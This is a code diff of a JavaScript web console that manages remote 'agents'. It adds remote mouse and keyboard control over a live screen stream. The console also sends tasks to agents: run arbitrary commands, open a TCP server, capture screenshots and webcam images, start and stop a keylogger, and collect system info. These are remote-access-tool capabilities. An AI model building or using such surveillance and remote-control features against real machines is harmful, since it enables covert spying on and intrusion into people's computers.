@@ -16,7 +16,12 @@
     var lastScreenFrameSeq = 0;
     var currentAgentAdminTab = 'agents';
 
-    var pendingTasks = {};  // task_id -> { timestamp, task }
+    // Remote control state
+    var remoteControlEnabled = false;
+    var screenWidth = 0, screenHeight = 0;
+    var canvas, ctx;
+
+    var pendingTasks = {};
     var commandInput, executeCmdBtn, tcpPort, tcpMessage, startTcpBtn, stopTcpBtn, tcpStatus,
         quickScreenshotBtn, quickWebcamBtn, quickKeyloggerStartBtn, quickKeyloggerStopBtn, quickInfoBtn,
         taskResultsLog;
@@ -85,18 +90,20 @@
         var emptyState = byId('screenEmptyState');
         var stage = byId('screenStage');
         var frame = byId('remoteScreenVideo');
+        var overlayCanvas = byId('remoteControlOverlay');
 
         if (emptyState) {
             emptyState.style.display = show ? 'flex' : 'none';
         }
-
         if (stage) {
             stage.classList.toggle('is-empty', show);
             stage.classList.toggle('has-frame', !show);
         }
-
         if (frame) {
             frame.style.display = show ? 'none' : 'block';
+        }
+        if (overlayCanvas) {
+            overlayCanvas.style.display = (!show && remoteControlEnabled) ? 'block' : 'none';
         }
     }
 
@@ -110,13 +117,13 @@
         }
 
         resultsBox.innerHTML = items.map(function (item) {
-            return ''
-                + '<div class="result-item">'
-                + '  <div class="result-top">'
-                + '    <div class="result-ip">' + escapeHtml(item.ip || '') + '</div>'
-                + '    <div class="result-hostname">' + escapeHtml(item.hostname || '') + '</div>'
-                + '  </div>'
-                + '</div>';
+            return '' +
+                '<div class="result-item">' +
+                '  <div class="result-top">' +
+                '    <div class="result-ip">' + escapeHtml(item.ip || '') + '</div>' +
+                '    <div class="result-hostname">' + escapeHtml(item.hostname || '') + '</div>' +
+                '  </div>' +
+                '</div>';
         }).join('');
     }
 
@@ -137,10 +144,8 @@
                 item.vendor || '',
                 item.os || item.os_name || ''
             ].join(' ').toLowerCase();
-
             return haystack.indexOf(term) !== -1;
         });
-
         renderResults(filtered);
     }
 
@@ -168,14 +173,9 @@
                 mode: mode || 'scan'
             })
         })
-        .then(function (r) {
-            return r.json();
-        })
+        .then(function (r) { return r.json(); })
         .then(function (data) {
-            if (!data.success) {
-                throw new Error(data.message || 'Scan failed.');
-            }
-
+            if (!data.success) throw new Error(data.message || 'Scan failed.');
             allResults = Array.isArray(data.results) ? data.results : [];
             setStatus(data.message || 'Scan completed.');
             setSummary('Hosts: ' + (data.hosts_up || 0));
@@ -188,9 +188,7 @@
             setSummary('Scan failed.');
             setRawOutput(err.message || 'Unknown scan error.');
         })
-        .finally(function () {
-            setLoadingState(false);
-        });
+        .finally(function () { setLoadingState(false); });
     }
 
     function formatAgentStatus(isOnline) {
@@ -215,25 +213,25 @@
         setAgentStatus('Connected agents: ' + list.length);
 
         tbody.innerHTML = list.map(function (a) {
-            return ''
-                + '<tr>'
-                + '   <td>' + formatAgentStatus(!!a.is_online) + '</td>'
-                + '   <td>' + escapeHtml(a.hostname || '-') + '</td>'
-                + '   <td>' + escapeHtml(a.local_ip || '-') + '</td>'
-                + '   <td>' + escapeHtml(a.os_name || '-') + '</td>'
-                + '   <td>' + escapeHtml(a.architecture || '-') + '</td>'
-                + '   <td>' + escapeHtml(a.cpu_info || '-') + '</td>'
-                + '   <td>' + escapeHtml(a.ram_mb || '0') + '</td>'
-                + '   <td>' + escapeHtml(a.disk_free_gb || '0') + '</td>'
-                + '   <td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td>'
-                + '   <td>' + escapeHtml(a.last_seen || '-') + '</td>'
-                + '   <td>'
-                + '    <div class="table-action-stack">'
-                + '      <button type="button" class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button>'
-                + '      <button type="button" class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button>'
-                + '    </div>'
-                + '   </td>'
-                + '</tr>';
+            return '' +
+                '<tr>' +
+                '    <td>' + formatAgentStatus(!!a.is_online) + '</td>' +
+                '    <td>' + escapeHtml(a.hostname || '-') + '</td>' +
+                '    <td>' + escapeHtml(a.local_ip || '-') + '</td>' +
+                '    <td>' + escapeHtml(a.os_name || '-') + '</td>' +
+                '    <td>' + escapeHtml(a.architecture || '-') + '</td>' +
+                '    <td>' + escapeHtml(a.cpu_info || '-') + '</td>' +
+                '    <td>' + escapeHtml(a.ram_mb || '0') + '</td>' +
+                '    <td>' + escapeHtml(a.disk_free_gb || '0') + '</td>' +
+                '    <td>' + escapeHtml(a.wazuh_status || 'unknown') + '</td>' +
+                '    <td>' + escapeHtml(a.last_seen || '-') + '</td>' +
+                '    <td>' +
+                '    <div class="table-action-stack">' +
+                '      <button type="button" class="btn btn-dark btn-sm" onclick="sendAgentTask(\'' + escapeHtml(a.agent_uuid) + '\', \'ping\')">Ping</button>' +
+                '      <button type="button" class="btn btn-primary btn-sm" onclick="openScreenViewer(\'' + escapeHtml(a.agent_uuid) + '\')">View Screen</button>' +
+                '    </div>' +
+                '    </td>' +
+                '</tr>';
         }).join('');
 
         populateScreenAgentOptions(list);
@@ -245,14 +243,12 @@
 
         var current = currentScreenAgentUuid || select.value || '';
         var options = ['<option value="">Select an agent</option>'];
-
         list.forEach(function (agent) {
             var value = String(agent.agent_uuid || '');
             var label = (agent.hostname || value || 'Unknown Agent') + ' (' + (agent.local_ip || '-') + ')';
             var selected = current && current === value ? ' selected' : '';
             options.push('<option value="' + escapeHtml(value) + '"' + selected + '>' + escapeHtml(label) + '</option>');
         });
-
         select.innerHTML = options.join('');
     }
 
@@ -261,18 +257,12 @@
             method: 'GET',
             headers: { 'Accept': 'application/json' }
         })
-        .then(function (r) {
-            return r.json();
-        })
+        .then(function (r) { return r.json(); })
         .then(function (data) {
-            if (!data.success) {
-                throw new Error(data.message || 'Failed to load agents.');
-            }
+            if (!data.success) throw new Error(data.message || 'Failed to load agents.');
             renderAgents(data.data || []);
         })
-        .catch(function (err) {
-            setAgentStatus('Agent load error: ' + err.message);
-        });
+        .catch(function (err) { setAgentStatus('Agent load error: ' + err.message); });
     }
 
     function renderDevices(list) {
@@ -287,16 +277,16 @@
         }
 
         tbody.innerHTML = list.map(function (row) {
-            return ''
-                + '<tr>'
-                + '   <td>' + escapeHtml(row.ip_address || '-') + '</td>'
-                + '   <td>' + escapeHtml(row.hostname || '-') + '</td>'
-                + '   <td>' + escapeHtml(row.mac_address || '-') + '</td>'
-                + '   <td>' + escapeHtml(row.vendor || '-') + '</td>'
-                + '   <td>' + escapeHtml(row.status || '-') + '</td>'
-                + '   <td>' + escapeHtml(row.last_seen || '-') + '</td>'
-                + '   <td><button type="button" class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td>'
-                + '</tr>';
+            return '' +
+                '<tr>' +
+                '    <td>' + escapeHtml(row.ip_address || '-') + '</td>' +
+                '    <td>' + escapeHtml(row.hostname || '-') + '</td>' +
+                '    <td>' + escapeHtml(row.mac_address || '-') + '</td>' +
+                '    <td>' + escapeHtml(row.vendor || '-') + '</td>' +
+                '    <td>' + escapeHtml(row.status || '-') + '</td>' +
+                '    <td>' + escapeHtml(row.last_seen || '-') + '</td>' +
+                '    <td><button type="button" class="btn btn-dark btn-sm" onclick="deleteSavedDevice(' + Number(row.id || 0) + ')">Delete</button></td>' +
+                '</tr>';
         }).join('');
     }
 
@@ -304,10 +294,7 @@
         var searchInput = byId('deviceSearchInput');
         var query = searchInput ? searchInput.value.trim() : '';
         var url = BASE_PATH + '/backend/api/devices.php';
-
-        if (query) {
-            url += '?search=' + encodeURIComponent(query);
-        }
+        if (query) url += '?search=' + encodeURIComponent(query);
 
         setDevicesStatus('Loading saved devices...');
 
@@ -315,75 +302,49 @@
             method: 'GET',
             headers: { 'Accept': 'application/json' }
         })
-        .then(function (r) {
-            return r.json();
-        })
+        .then(function (r) { return r.json(); })
         .then(function (data) {
-            if (!data.success) {
-                throw new Error(data.message || 'Failed to load devices.');
-            }
-
+            if (!data.success) throw new Error(data.message || 'Failed to load devices.');
             renderDevices(data.devices || []);
             setDevicesStatus('Saved devices: ' + ((data.devices || []).length));
         })
-        .catch(function (err) {
-            setDevicesStatus('Saved devices error: ' + err.message);
-        });
+        .catch(function (err) { setDevicesStatus('Saved devices error: ' + err.message); });
     }
 
     function deleteSavedDevice(id) {
         if (!id) return;
-
-        if (!window.confirm('Delete this saved device?')) {
-            return;
-        }
+        if (!window.confirm('Delete this saved device?')) return;
 
         fetch(BASE_PATH + '/backend/api/delete_device.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ id: id })
         })
-        .then(function (r) {
-            return r.json();
-        })
+        .then(function (r) { return r.json(); })
         .then(function (data) {
-            if (!data.success) {
-                throw new Error(data.message || 'Delete failed.');
-            }
+            if (!data.success) throw new Error(data.message || 'Delete failed.');
             loadDevices();
         })
-        .catch(function (err) {
-            setDevicesStatus('Delete error: ' + err.message);
-        });
+        .catch(function (err) { setDevicesStatus('Delete error: ' + err.message); });
     }
 
     function sendAgentTask(agentUUID, task) {
         fetch(BASE_PATH + '/backend/api/send_agent_task.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                agent_uuid: agentUUID,
-                task: task
-            })
+            body: JSON.stringify({ agent_uuid: agentUUID, task: task })
         })
-        .then(function (res) {
-            return res.json();
-        })
-        .then(function () {
-            loadAgents();
-        })
-        .catch(function (err) {
-            console.error('Task send error:', err);
-        });
+        .then(function (res) { return res.json(); })
+        .then(function () { loadAgents(); })
+        .catch(function (err) { console.error('Task send error:', err); });
     }
 
-    // Remote control helper functions
     function generateTaskId() {
         return Date.now() + '-' + Math.random().toString(36).substr(2, 8);
     }
 
     function addTaskResultToLog(taskId, status, output) {
-        var log = document.getElementById('taskResultsLog');
+        var log = byId('taskResultsLog');
         if (!log) return;
 
         if (log.innerHTML.includes('No tasks executed yet.')) {
@@ -437,30 +398,22 @@
 
     function clearRemoteScreen() {
         var frame = byId('remoteScreenVideo');
-        if (frame) {
-            frame.removeAttribute('src');
-        }
-
+        if (frame) frame.removeAttribute('src');
         lastScreenFrameSeq = 0;
         showScreenEmptyState(true);
     }
 
     function ensureWsConnected() {
-        if (ws && ws.readyState === WebSocket.OPEN) {
-            return Promise.resolve();
-        }
-
+        if (ws && ws.readyState === WebSocket.OPEN) return Promise.resolve();
         return new Promise(function (resolve, reject) {
             var checks = 0;
             var timer = setInterval(function () {
                 checks += 1;
-
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     clearInterval(timer);
                     resolve();
                     return;
                 }
-
                 if (checks > 50) {
                     clearInterval(timer);
                     reject(new Error('WebSocket not connected.'));
@@ -470,17 +423,13 @@
     }
 
     function sendWsMessage(payload) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            throw new Error('WebSocket not connected.');
-        }
-
+        if (!ws || ws.readyState !== WebSocket.OPEN) throw new Error('WebSocket not connected.');
         ws.send(JSON.stringify(payload));
     }
 
     function startScreenView() {
         var select = byId('screenAgentSelect');
         var agentUuid = select ? select.value : '';
-
         if (!agentUuid) {
             setScreenStatus('Select an agent first.');
             return;
@@ -507,6 +456,10 @@
 
     function stopScreenView() {
         isScreenViewing = false;
+        remoteControlEnabled = false;
+        var toggle = byId('remoteControlToggle');
+        if (toggle) toggle.checked = false;
+        updateRemoteOverlay();
 
         if (ws && ws.readyState === WebSocket.OPEN) {
             try {
@@ -515,13 +468,146 @@
                     viewer_id: VIEWER_ID,
                     target_agent_uuid: currentScreenAgentUuid
                 });
-            } catch (e) {
-                console.error(e);
-            }
+            } catch (e) { console.error(e); }
         }
-
         clearRemoteScreen();
         setScreenStatus('Viewer stopped.');
+    }
+
+    function toggleFullscreen() {
+        var stage = byId('screenStage');
+        if (!stage) return;
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            if (stage.requestFullscreen) {
+                stage.requestFullscreen();
+            } else if (stage.webkitRequestFullscreen) {
+                stage.webkitRequestFullscreen();
+            }
+        } else {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
+        }
+    }
+
+    function updateRemoteOverlay() {
+        var overlay = byId('remoteControlOverlay');
+        if (overlay) {
+            overlay.style.display = (isScreenViewing && remoteControlEnabled) ? 'block' : 'none';
+        }
+    }
+
+    function getScaledCoords(clientX, clientY) {
+        var overlay = byId('remoteControlOverlay');
+        if (!overlay) return { x: 0, y: 0 };
+        var rect = overlay.getBoundingClientRect();
+        var scaleX = screenWidth / rect.width;
+        var scaleY = screenHeight / rect.height;
+        var canvasX = (clientX - rect.left) * scaleX;
+        var canvasY = (clientY - rect.top) * scaleY;
+        return {
+            x: Math.max(0, Math.min(screenWidth, canvasX)),
+            y: Math.max(0, Math.min(screenHeight, canvasY))
+        };
+    }
+
+    function sendInput(msg) {
+        if (!isScreenViewing || !remoteControlEnabled || !currentScreenAgentUuid) {
+            console.log('Input blocked: viewing=' + isScreenViewing + ', remote=' + remoteControlEnabled + ', uuid=' + currentScreenAgentUuid);
+            return;
+        }
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            console.log('WebSocket not open');
+            return;
+        }
+        msg.type = 'input_event';
+        msg.target_agent_uuid = currentScreenAgentUuid;
+        ws.send(JSON.stringify(msg));
+        console.log('Sent input:', msg);
+    }
+
+    function initRemoteControl() {
+        canvas = byId('remoteControlOverlay');
+        if (!canvas) {
+            console.error('Canvas overlay not found');
+            return;
+        }
+        ctx = canvas.getContext('2d');
+
+        // Mouse move
+        canvas.addEventListener('mousemove', function (e) {
+            if (!remoteControlEnabled) return;
+            var coords = getScaledCoords(e.clientX, e.clientY);
+            sendInput({ event_type: 'mouse_move', x: Math.round(coords.x), y: Math.round(coords.y) });
+        });
+
+        // Mouse down
+        canvas.addEventListener('mousedown', function (e) {
+            e.preventDefault();
+            if (!remoteControlEnabled) return;
+            var button = e.button === 0 ? 'left' : (e.button === 2 ? 'right' : 'middle');
+            sendInput({ event_type: 'mouse_click', button: button, pressed: true });
+        });
+
+        // Mouse up
+        canvas.addEventListener('mouseup', function (e) {
+            e.preventDefault();
+            if (!remoteControlEnabled) return;
+            var button = e.button === 0 ? 'left' : (e.button === 2 ? 'right' : 'middle');
+            sendInput({ event_type: 'mouse_click', button: button, pressed: false });
+        });
+
+        // Wheel
+        canvas.addEventListener('wheel', function (e) {
+            e.preventDefault();
+            if (!remoteControlEnabled) return;
+            var delta = e.deltaY > 0 ? -3 : 3;
+            sendInput({ event_type: 'mouse_scroll', delta: delta });
+        });
+
+        // Context menu prevention
+        canvas.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+
+        // Keyboard events on window (not document) to capture all keys
+        window.addEventListener('keydown', function (e) {
+            if (!remoteControlEnabled) return;
+            // Ignore if typing in input or textarea
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            e.preventDefault();
+            var key = e.key;
+            // Normalize key names
+            if (key === ' ') key = 'space';
+            else if (key === 'Enter') key = 'enter';
+            else if (key === 'Control') key = 'ctrl';
+            else if (key === 'Alt') key = 'alt';
+            else if (key === 'Shift') key = 'shift';
+            else if (key === 'ArrowUp') key = 'up';
+            else if (key === 'ArrowDown') key = 'down';
+            else if (key === 'ArrowLeft') key = 'left';
+            else if (key === 'ArrowRight') key = 'right';
+            sendInput({ event_type: 'key', key: key, pressed: true });
+        });
+
+        window.addEventListener('keyup', function (e) {
+            if (!remoteControlEnabled) return;
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            e.preventDefault();
+            var key = e.key;
+            if (key === ' ') key = 'space';
+            else if (key === 'Enter') key = 'enter';
+            else if (key === 'Control') key = 'ctrl';
+            else if (key === 'Alt') key = 'alt';
+            else if (key === 'Shift') key = 'shift';
+            else if (key === 'ArrowUp') key = 'up';
+            else if (key === 'ArrowDown') key = 'down';
+            else if (key === 'ArrowLeft') key = 'left';
+            else if (key === 'ArrowRight') key = 'right';
+            sendInput({ event_type: 'key', key: key, pressed: false });
+        });
+
+        console.log('Remote control initialized');
     }
 
     function handleScreenMessage(msg) {
@@ -532,56 +618,57 @@
             setScreenStatus(msg.message || 'Viewer subscribed. Waiting for frames...');
             return;
         }
-
         if (msg.type === 'screen_status') {
             if (msg.status === 'stopped') {
                 clearRemoteScreen();
+                remoteControlEnabled = false;
+                var toggle = byId('remoteControlToggle');
+                if (toggle) toggle.checked = false;
+                updateRemoteOverlay();
             }
             setScreenStatus(msg.message || ('Screen status: ' + (msg.status || 'unknown')));
             return;
         }
-
         if (msg.type === 'agent_status') {
             if (msg.status === 'offline' && currentScreenAgentUuid && msg.agent_uuid === currentScreenAgentUuid) {
                 clearRemoteScreen();
                 setScreenStatus(msg.message || 'Agent disconnected.');
+                remoteControlEnabled = false;
+                updateRemoteOverlay();
             }
             return;
         }
-
         if (msg.type === 'screen_frame') {
             if (!isScreenViewing || !msg.image) return;
             if (msg.seq && lastScreenFrameSeq && Number(msg.seq) < Number(lastScreenFrameSeq)) return;
 
             lastScreenFrameSeq = Number(msg.seq || 0);
+            screenWidth = msg.width || 0;
+            screenHeight = msg.height || 0;
 
             var mimeType = msg.mime_type || 'image/png';
             var frame = byId('remoteScreenVideo');
-
             if (frame) {
                 frame.src = 'data:' + mimeType + ';base64,' + msg.image;
             }
-
             showScreenEmptyState(false);
+            updateRemoteOverlay();
 
             var backend = msg.backend ? (' via ' + msg.backend) : '';
-            setScreenStatus('Receiving live screen from Python agent' + backend + '.');
+            setScreenStatus('Receiving live screen from Python agent' + backend + '. Remote control ' + (remoteControlEnabled ? 'ON' : 'OFF'));
         }
     }
 
     function connectWebSocket() {
         try {
             ws = new WebSocket(WS_URL);
-
             ws.onopen = function () {
                 ws.send(JSON.stringify({
                     type: 'register',
                     peer_type: 'screen_admin',
                     viewer_id: VIEWER_ID
                 }));
-
                 setAgentStatus('WebSocket connected.');
-
                 if (isScreenViewing && currentScreenAgentUuid) {
                     sendWsMessage({
                         type: 'screen_subscribe',
@@ -589,43 +676,25 @@
                         target_agent_uuid: currentScreenAgentUuid
                     });
                 }
-
                 loadAgents();
             };
-
             ws.onmessage = function (event) {
                 try {
                     var msg = JSON.parse(event.data);
-
                     if (msg.type === 'task_result') {
-                        var taskId = msg.task_id || 'unknown';
-                        var status = msg.result_status || 'unknown';
-                        var output = msg.output_text || '';
-                        addTaskResultToLog(taskId, status, output);
+                        addTaskResultToLog(msg.task_id || 'unknown', msg.result_status || 'unknown', msg.output_text || '');
                         return;
                     }
-
-                    if (
-                        msg.type === 'screen_subscribed' ||
-                        msg.type === 'screen_status' ||
-                        msg.type === 'screen_frame' ||
-                        msg.type === 'agent_status'
-                    ) {
+                    if (msg.type === 'screen_subscribed' || msg.type === 'screen_status' || msg.type === 'screen_frame' || msg.type === 'agent_status') {
                         handleScreenMessage(msg);
                     }
-                } catch (e) {
-                    console.error(e);
-                }
+                } catch (e) { console.error(e); }
             };
-
             ws.onclose = function () {
                 setAgentStatus('WebSocket disconnected. Retrying...');
                 setTimeout(connectWebSocket, 3000);
             };
-
-            ws.onerror = function () {
-                setAgentStatus('WebSocket error.');
-            };
+            ws.onerror = function () { setAgentStatus('WebSocket error.'); };
         } catch (e) {
             console.error(e);
             setAgentStatus('Failed to initialize WebSocket.');
@@ -639,16 +708,11 @@
             screen: 'agentAdminTabScreen',
             remote: 'agentAdminTabRemote'
         };
-
         currentAgentAdminTab = validTabs[tabName] ? tabName : 'agents';
-
         Object.keys(validTabs).forEach(function (key) {
             var panel = byId(validTabs[key]);
-            if (panel) {
-                panel.hidden = key !== currentAgentAdminTab;
-            }
+            if (panel) panel.hidden = key !== currentAgentAdminTab;
         });
-
         qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
             var isActive = btn.getAttribute('data-agent-admin-tab-trigger') === currentAgentAdminTab;
             btn.classList.toggle('is-active', isActive);
@@ -659,11 +723,9 @@
         qsa('.view-panel').forEach(function (panel) {
             panel.classList.toggle('is-active', panel.id === viewId);
         });
-
         qsa('.nav-link').forEach(function (btn) {
             btn.classList.toggle('is-active', btn.getAttribute('data-view-target') === viewId);
         });
-
         if (viewId === 'agentsView') {
             activateAgentAdminTab(agentAdminTab || currentAgentAdminTab || 'agents');
         }
@@ -672,22 +734,15 @@
     function openScreenViewer(agentUuid) {
         activateView('agentsView', 'screen');
         currentScreenAgentUuid = agentUuid || '';
-
         var select = byId('screenAgentSelect');
-        if (select && agentUuid) {
-            select.value = agentUuid;
-        }
-
+        if (select && agentUuid) select.value = agentUuid;
         setScreenStatus('Selected agent. Click Start Viewing to request the Python screen stream.');
     }
 
     function bindNavigation() {
         qsa('[data-view-target]').forEach(function (btn) {
             btn.addEventListener('click', function () {
-                activateView(
-                    btn.getAttribute('data-view-target'),
-                    btn.getAttribute('data-agent-admin-tab') || ''
-                );
+                activateView(btn.getAttribute('data-view-target'), btn.getAttribute('data-agent-admin-tab') || '');
             });
         });
     }
@@ -703,38 +758,15 @@
         var refreshViewerAgentsBtn = byId('refreshViewerAgentsBtn');
         var startScreenViewBtn = byId('startScreenViewBtn');
         var stopScreenViewBtn = byId('stopScreenViewBtn');
+        var fullscreenBtn = byId('fullscreenBtn');
+        var remoteToggle = byId('remoteControlToggle');
 
-        if (start) {
-            start.onclick = function () { runScan('scan'); };
-        }
-
-        if (detect) {
-            detect.onclick = function () { runScan('detect'); };
-        }
-
-        if (refresh) {
-            refresh.onclick = function () {
-                filterResults();
-                loadAgents();
-                loadDevices();
-            };
-        }
-
-        if (search) {
-            search.addEventListener('input', filterResults);
-        }
-
-        if (deviceSearch) {
-            deviceSearch.addEventListener('input', function () {
-                loadDevices();
-            });
-        }
-
-        if (deviceRefresh) {
-            deviceRefresh.onclick = function () {
-                loadDevices();
-            };
-        }
+        if (start) start.onclick = function () { runScan('scan'); };
+        if (detect) detect.onclick = function () { runScan('detect'); };
+        if (refresh) refresh.onclick = function () { filterResults(); loadAgents(); loadDevices(); };
+        if (search) search.addEventListener('input', filterResults);
+        if (deviceSearch) deviceSearch.addEventListener('input', loadDevices);
+        if (deviceRefresh) deviceRefresh.onclick = loadDevices;
 
         qsa('[data-agent-admin-tab-trigger]').forEach(function (btn) {
             btn.addEventListener('click', function () {
@@ -744,34 +776,28 @@
 
         if (screenSelect) {
             screenSelect.addEventListener('change', function () {
-                if (isScreenViewing) {
-                    stopScreenView();
-                }
-
+                if (isScreenViewing) stopScreenView();
                 currentScreenAgentUuid = screenSelect.value || '';
-                setScreenStatus(
-                    currentScreenAgentUuid
-                        ? 'Selected agent. Click Start Viewing to request the Python stream.'
-                        : 'Waiting for a selected agent.'
-                );
+                setScreenStatus(currentScreenAgentUuid ? 'Selected agent. Click Start Viewing.' : 'Waiting for a selected agent.');
+                remoteControlEnabled = false;
+                if (remoteToggle) remoteToggle.checked = false;
+                updateRemoteOverlay();
+            });
+        }
+        if (refreshViewerAgentsBtn) refreshViewerAgentsBtn.onclick = loadAgents;
+        if (startScreenViewBtn) startScreenViewBtn.onclick = startScreenView;
+        if (stopScreenViewBtn) stopScreenViewBtn.onclick = stopScreenView;
+        if (fullscreenBtn) fullscreenBtn.onclick = toggleFullscreen;
+        if (remoteToggle) {
+            remoteToggle.addEventListener('change', function () {
+                remoteControlEnabled = remoteToggle.checked;
+                updateRemoteOverlay();
+                setScreenStatus((isScreenViewing ? 'Screen active. ' : 'Start viewing first. ') + 'Remote control ' + (remoteControlEnabled ? 'ON' : 'OFF'));
+                console.log('Remote control toggled:', remoteControlEnabled);
             });
         }
 
-        if (refreshViewerAgentsBtn) {
-            refreshViewerAgentsBtn.onclick = function () {
-                loadAgents();
-            };
-        }
-
-        if (startScreenViewBtn) {
-            startScreenViewBtn.onclick = startScreenView;
-        }
-
-        if (stopScreenViewBtn) {
-            stopScreenViewBtn.onclick = stopScreenView;
-        }
-
-        // Remote control elements
+        // Remote control UI elements
         commandInput = byId('commandInput');
         executeCmdBtn = byId('executeCmdBtn');
         tcpPort = byId('tcpPort');
@@ -789,93 +815,46 @@
         if (executeCmdBtn) {
             executeCmdBtn.onclick = function () {
                 var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) {
-                    setStatus('Please select an agent first (from the Agents list or Screen Viewer).');
-                    return;
-                }
+                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                 var cmd = commandInput.value.trim();
-                if (!cmd) {
-                    setStatus('Enter a command.');
-                    return;
-                }
+                if (!cmd) { setStatus('Enter a command.'); return; }
                 sendTask(agentUUID, 'cmd', { command: cmd });
                 addTaskResultToLog('pending', 'info', 'Executing: ' + cmd);
             };
         }
-
         if (startTcpBtn) {
             startTcpBtn.onclick = function () {
                 var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) {
-                    setStatus('Please select an agent first.');
-                    return;
-                }
+                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                 var port = parseInt(tcpPort.value, 10);
-                if (isNaN(port) || port < 1 || port > 65535) {
-                    setStatus('Invalid port number.');
-                    return;
-                }
+                if (isNaN(port) || port < 1 || port > 65535) { setStatus('Invalid port.'); return; }
                 var message = tcpMessage.value.trim();
-                var data = { port: port };
+                var data = { port: port, interactive: true };
                 if (message) data.message = message;
                 sendTask(agentUUID, 'tcp_server_start', data);
                 tcpStatus.textContent = 'Starting...';
             };
         }
-
         if (stopTcpBtn) {
             stopTcpBtn.onclick = function () {
                 var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) {
-                    setStatus('Please select an agent first.');
-                    return;
-                }
+                if (!agentUUID) { setStatus('Select an agent first.'); return; }
                 sendTask(agentUUID, 'tcp_server_stop', {});
                 tcpStatus.textContent = 'Stopping...';
             };
         }
-
-        if (quickScreenshotBtn) {
-            quickScreenshotBtn.onclick = function () {
-                var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) return setStatus('Select an agent first.');
-                sendTask(agentUUID, 'screenshot', {});
-            };
-        }
-        if (quickWebcamBtn) {
-            quickWebcamBtn.onclick = function () {
-                var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) return setStatus('Select an agent first.');
-                sendTask(agentUUID, 'webcam', {});
-            };
-        }
-        if (quickKeyloggerStartBtn) {
-            quickKeyloggerStartBtn.onclick = function () {
-                var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) return setStatus('Select an agent first.');
-                sendTask(agentUUID, 'keylogger_start', {});
-            };
-        }
-        if (quickKeyloggerStopBtn) {
-            quickKeyloggerStopBtn.onclick = function () {
-                var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) return setStatus('Select an agent first.');
-                sendTask(agentUUID, 'keylogger_stop', {});
-            };
-        }
-        if (quickInfoBtn) {
-            quickInfoBtn.onclick = function () {
-                var agentUUID = getSelectedAgentUUID();
-                if (!agentUUID) return setStatus('Select an agent first.');
-                sendTask(agentUUID, 'collect_info', {});
-            };
-        }
+        if (quickScreenshotBtn) quickScreenshotBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'screenshot', {}); else setStatus('Select agent.'); };
+        if (quickWebcamBtn) quickWebcamBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'webcam', {}); else setStatus('Select agent.'); };
+        if (quickKeyloggerStartBtn) quickKeyloggerStartBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'keylogger_start', {}); else setStatus('Select agent.'); };
+        if (quickKeyloggerStopBtn) quickKeyloggerStopBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'keylogger_stop', {}); else setStatus('Select agent.'); };
+        if (quickInfoBtn) quickInfoBtn.onclick = function () { var a = getSelectedAgentUUID(); if(a) sendTask(a, 'collect_info', {}); else setStatus('Select agent.'); };
     }
 
     document.addEventListener('DOMContentLoaded', function () {
         bindNavigation();
         bindEvents();
         connectWebSocket();
+        initRemoteControl();
 
         setStatus('Ready');
         setSummary('No scan yet.');
@@ -891,7 +870,6 @@
 
         if (agentPollTimer) clearInterval(agentPollTimer);
         if (devicesPollTimer) clearInterval(devicesPollTimer);
-
         agentPollTimer = setInterval(loadAgents, 5000);
         devicesPollTimer = setInterval(loadDevices, 10000);
 
